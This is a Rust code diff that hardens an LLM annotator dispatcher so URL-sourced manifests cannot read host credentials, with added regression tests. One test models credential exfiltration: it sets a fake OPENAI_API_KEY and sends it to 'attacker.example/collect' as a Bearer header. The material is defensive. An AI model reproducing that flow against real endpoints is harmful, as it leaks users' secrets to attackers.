@@ -3,17 +3,44 @@ use crate::dispatchers::{
     constants::*,
     http, resolve,
 };
-use crate::{AnnotatorDispatcher, AnnotatorInvocation, JsonValue, RuntimeError};
+use crate::{AnnotatorDispatcher, AnnotatorInvocation, JsonValue, Limits, RuntimeError};
 use serde_json::json;
 use sha2::{Digest, Sha256};
 use std::collections::BTreeMap;
 
-#[derive(Debug, Default, Clone, Copy)]
-pub struct LlmAnnotator;
+#[derive(Debug, Clone, Copy)]
+pub struct LlmAnnotator {
+    limits: Limits,
+    url_sourced: bool,
+}
+
+impl Default for LlmAnnotator {
+    fn default() -> Self {
+        Self::new()
+    }
+}
 
 impl LlmAnnotator {
     pub fn new() -> Self {
-        Self
+        Self {
+            limits: Limits::default(),
+            url_sourced: false,
+        }
+    }
+
+    pub fn with_limits(mut self, limits: Limits) -> Self {
+        self.limits = limits;
+        self
+    }
+
+    /// Mark this dispatcher as serving a URL sourced (untrusted) manifest. When
+    /// set, the `llm` credential resolution never falls back to a host
+    /// environment variable, including a provider's default credential env var,
+    /// so a remote manifest cannot exfiltrate a host secret to the endpoint it
+    /// also controls. Credentials must be supplied inline instead.
+    pub fn with_url_sourced(mut self, url_sourced: bool) -> Self {
+        self.url_sourced = url_sourced;
+        self
     }
 
     pub fn dispatch_with_transport(
@@ -28,6 +55,8 @@ impl LlmAnnotator {
             annotator,
             preliminary_policy_input,
             transport,
+            self.limits,
+            self.url_sourced,
         )
     }
 }
@@ -44,6 +73,8 @@ impl AnnotatorDispatcher for LlmAnnotator {
             annotator,
             preliminary_policy_input,
             &UreqHttpTransport,
+            self.limits,
+            self.url_sourced,
         )
     }
 }
@@ -53,6 +84,8 @@ fn dispatch_with_transport(
     annotator: &AnnotatorInvocation,
     preliminary_policy_input: &JsonValue,
     transport: &dyn HttpTransport,
+    limits: Limits,
+    url_sourced: bool,
 ) -> Result<JsonValue, RuntimeError> {
     if annotator.field(ANNOTATOR_TYPE).and_then(JsonValue::as_str) != Some(TYPE_LLM) {
         return Err(resolve::failed(
@@ -60,7 +93,7 @@ fn dispatch_with_transport(
             "LLM dispatcher received a non-LLM annotator",
         ));
     }
-    let cfg = LlmConfig::from_fields(annotator_name, &annotator.fields)?;
+    let cfg = LlmConfig::from_fields(annotator_name, &annotator.fields, limits, url_sourced)?;
     let policy_target =
         resolve::policy_target_text(annotator_name, annotator, preliminary_policy_input)?;
     let request = request_for_provider(annotator_name, &cfg, &policy_target)?;
@@ -102,6 +135,7 @@ struct LlmConfig {
     aws_session_token_env: Option<String>,
     aws_amz_date: Option<String>,
     aws_date: Option<String>,
+    url_sourced: bool,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -128,10 +162,44 @@ impl LlmProvider {
     }
 }
 
+/// Resolve the system prompt for an LLM annotator from exactly one configured
+/// source. Inline `system_prompt` (or its `prompt` alias) wins, then a
+/// manifest relative `system_prompt_file` read from disk, then a pinned
+/// `system_prompt_url` fetched over the extends trust gate. With no source the
+/// preset default is used. The manifest validator already rejects more than
+/// one source, so the precedence here only orders the single configured case.
+/// Any read or fetch failure fails closed as an annotator error.
+fn resolve_system_prompt(
+    annotator_name: &str,
+    fields: &BTreeMap<String, JsonValue>,
+    limits: Limits,
+) -> Result<String, RuntimeError> {
+    if let Some(text) = http::optional_string_field(fields, FIELD_SYSTEM_PROMPT)
+        .or_else(|| http::optional_string_field(fields, FIELD_PROMPT))
+    {
+        return Ok(text.to_string());
+    }
+    if let Some(path) = http::optional_string_field(fields, FIELD_SYSTEM_PROMPT_FILE) {
+        return std::fs::read_to_string(path).map_err(|error| {
+            resolve::failed(
+                annotator_name,
+                format!("failed to read system_prompt_file '{path}': {error}"),
+            )
+        });
+    }
+    if let Some(value) = fields.get(FIELD_SYSTEM_PROMPT_URL) {
+        return crate::manifest::fetch_pinned_https_text(value, limits)
+            .map_err(|error| resolve::failed(annotator_name, error.detail().to_string()));
+    }
+    Ok(DEFAULT_SYSTEM_PROMPT.to_string())
+}
+
 impl LlmConfig {
     fn from_fields(
         annotator_name: &str,
         fields: &BTreeMap<String, JsonValue>,
+        limits: Limits,
+        url_sourced: bool,
     ) -> Result<Self, RuntimeError> {
         let provider = LlmProvider::parse(http::optional_string_field(fields, FIELD_PROVIDER))
             .map_err(|error| resolve::failed(annotator_name, error))?;
@@ -142,10 +210,7 @@ impl LlmConfig {
                 _ => DEFAULT_MODEL,
             })
             .to_string();
-        let prompt = http::optional_string_field(fields, FIELD_SYSTEM_PROMPT)
-            .or_else(|| http::optional_string_field(fields, FIELD_PROMPT))
-            .unwrap_or(DEFAULT_SYSTEM_PROMPT)
-            .to_string();
+        let prompt = resolve_system_prompt(annotator_name, fields, limits)?;
         Ok(Self {
             provider,
             endpoint: opt_string(fields, FIELD_ENDPOINT),
@@ -175,6 +240,7 @@ impl LlmConfig {
             aws_session_token_env: opt_string(fields, FIELD_AWS_SESSION_TOKEN_ENV),
             aws_amz_date: opt_string(fields, FIELD_AWS_AMZ_DATE),
             aws_date: opt_string(fields, FIELD_AWS_DATE),
+            url_sourced,
         })
     }
 
@@ -185,6 +251,13 @@ impl LlmConfig {
     ) -> Result<Option<String>, RuntimeError> {
         if let Some(value) = &self.api_key {
             return Ok(Some(value.clone()));
+        }
+        // A URL sourced manifest must not read any host environment credential,
+        // neither an explicit `api_key_env` (already rejected at load) nor a
+        // provider default env var, because it also controls the egress
+        // endpoint. Inline only; absence yields no credential.
+        if self.url_sourced {
+            return Ok(None);
         }
         let env_name = self.api_key_env.as_deref().or(default_env);
         match env_name {
@@ -407,14 +480,22 @@ fn bedrock_request(
         cfg.aws_access_key_id.as_deref(),
         cfg.aws_access_key_id_env.as_deref(),
         DEFAULT_AWS_ACCESS_KEY_ID_ENV,
+        cfg.url_sourced,
     )?;
     let secret_key = secret_field_or_env(
         annotator_name,
         cfg.aws_secret_access_key.as_deref(),
         cfg.aws_secret_access_key_env.as_deref(),
         DEFAULT_AWS_SECRET_ACCESS_KEY_ENV,
+        cfg.url_sourced,
     )?;
     let session_token = cfg.aws_session_token.clone().or_else(|| {
+        // A URL sourced manifest never reads a host environment session token,
+        // which the bedrock signer would otherwise send verbatim as the
+        // x-amz-security-token header to the manifest controlled endpoint.
+        if cfg.url_sourced {
+            return None;
+        }
         let env_name = cfg
             .aws_session_token_env
             .as_deref()
@@ -606,9 +687,20 @@ fn secret_field_or_env(
     direct: Option<&str>,
     env_name: Option<&str>,
     default_env: &str,
+    url_sourced: bool,
 ) -> Result<String, RuntimeError> {
     if let Some(value) = direct {
         return Ok(value.to_string());
+    }
+    // A URL sourced manifest is untrusted for host local access, so it must not
+    // read an AWS credential from the host environment, neither an explicit
+    // `aws_*_env` (already rejected at load) nor the provider default env var.
+    // Fail closed so the credential is supplied inline or not at all.
+    if url_sourced {
+        return Err(resolve::failed(
+            annotator_name,
+            "a URL sourced manifest must supply this AWS credential inline; host environment credentials are not read for an untrusted remote manifest",
+        ));
     }
     let env_name = env_name.unwrap_or(default_env);
     std::env::var(env_name).map_err(|_| {
@@ -878,6 +970,81 @@ mod tests {
         );
     }
 
+    fn try_dispatch_url_sourced(
+        annotator: AnnotatorInvocation,
+        body: &str,
+    ) -> (Result<JsonValue, RuntimeError>, StubHttpTransport) {
+        let transport = StubHttpTransport::with_response(200, body);
+        let result = LlmAnnotator::new()
+            .with_url_sourced(true)
+            .dispatch_with_transport("judge", &annotator, &pi(), &transport);
+        (result, transport)
+    }
+
+    #[test]
+    fn url_sourced_llm_does_not_send_default_env_api_key_to_endpoint() {
+        // Security regression: a URL sourced manifest controls the `endpoint`
+        // but must not cause the bundled `llm` dispatcher to read the provider
+        // default credential (OPENAI_API_KEY) and ship it there. A file sourced
+        // manifest keeps the historical default-env behavior.
+        std::env::set_var("OPENAI_API_KEY", "sk-host-secret-CONFIDENTIAL");
+        let attacker = json!("https://attacker.example/collect");
+        let body = r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#;
+
+        // File sourced (url_sourced = false): default env is read and attached.
+        let (_out, file_request) = dispatch(annotator(&[(FIELD_ENDPOINT, attacker.clone())]), body);
+        assert_eq!(file_request.url, "https://attacker.example/collect");
+        assert_eq!(
+            file_request.headers[HEADER_AUTHORIZATION],
+            "Bearer sk-host-secret-CONFIDENTIAL"
+        );
+
+        // URL sourced: no host credential is read, so no Authorization header.
+        let (result, transport) =
+            try_dispatch_url_sourced(annotator(&[(FIELD_ENDPOINT, attacker)]), body);
+        result.expect("dispatch still completes, just without a host credential");
+        let url_request = transport.last_request().expect("request captured");
+        assert_eq!(url_request.url, "https://attacker.example/collect");
+        assert!(
+            !url_request.headers.contains_key(HEADER_AUTHORIZATION),
+            "URL sourced manifest must not attach a host credential"
+        );
+
+        std::env::remove_var("OPENAI_API_KEY");
+    }
+
+    #[test]
+    fn url_sourced_llm_still_uses_inline_credentials() {
+        // The restriction is host-environment only; an inline credential the
+        // remote manifest supplies itself is still honored.
+        let (result, transport) = try_dispatch_url_sourced(
+            annotator(&[(FIELD_API_KEY, json!("sk-inline-from-manifest"))]),
+            r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#,
+        );
+        result.expect("inline credential dispatch succeeds");
+        let request = transport.last_request().expect("request captured");
+        assert_eq!(
+            request.headers[HEADER_AUTHORIZATION],
+            "Bearer sk-inline-from-manifest"
+        );
+    }
+
+    #[test]
+    fn url_sourced_bedrock_without_inline_credentials_fails_closed() {
+        // Bedrock would otherwise read default AWS_* credentials and send the
+        // session token verbatim; a URL sourced manifest fails closed instead.
+        let (result, _transport) = try_dispatch_url_sourced(
+            annotator(&[
+                (FIELD_PROVIDER, json!("bedrock")),
+                (FIELD_MODEL, json!("anthropic.claude-3")),
+                (FIELD_AWS_REGION, json!("us-east-1")),
+            ]),
+            r#"{"output":{"message":{"content":[{"text":"{\"label\":\"safe\"}"}]}}}"#,
+        );
+        let error = result.expect_err("must fail closed without inline AWS credentials");
+        assert!(error.detail().contains("inline"));
+    }
+
     #[test]
     fn openai_compatible_allows_local_gateway_without_key() {
         let (_output, request) = dispatch(
@@ -1033,6 +1200,52 @@ mod tests {
             )
             .expect_err("HTTP error fails");
 
+        assert!(matches!(error, RuntimeError::AnnotationFailed(_)));
+    }
+
+    #[test]
+    fn system_prompt_file_is_read_into_the_system_message() {
+        let path = std::env::temp_dir().join(format!(
+            "acs-system-prompt-{}-{:?}.txt",
+            std::process::id(),
+            std::thread::current().id()
+        ));
+        std::fs::write(&path, "classify strictly and audit").unwrap();
+        let (_output, request) = dispatch(
+            annotator(&[
+                (FIELD_PROVIDER, json!("openai_compatible")),
+                (
+                    FIELD_ENDPOINT,
+                    json!("http://127.0.0.1:8000/v1/chat/completions"),
+                ),
+                (FIELD_SYSTEM_PROMPT_FILE, json!(path.to_string_lossy())),
+            ]),
+            r#"{"choices":[{"message":{"content":"{\"label\":\"safe\"}"}}]}"#,
+        );
+        let _ = std::fs::remove_file(&path);
+        assert_eq!(
+            request.body[REQUEST_MESSAGES][0][REQUEST_CONTENT],
+            json!("classify strictly and audit")
+        );
+    }
+
+    #[test]
+    fn missing_system_prompt_file_fails_closed() {
+        let transport = StubHttpTransport::with_response(200, r#"{"choices":[]}"#);
+        let error = LlmAnnotator::new()
+            .dispatch_with_transport(
+                "judge",
+                &annotator(&[
+                    (FIELD_PROVIDER, json!("openai_compatible")),
+                    (
+                        FIELD_SYSTEM_PROMPT_FILE,
+                        json!("/nonexistent/acs/prompt.txt"),
+                    ),
+                ]),
+                &pi(),
+                &transport,
+            )
+            .expect_err("missing file fails closed");
         assert!(matches!(error, RuntimeError::AnnotationFailed(_)));
     }
 }
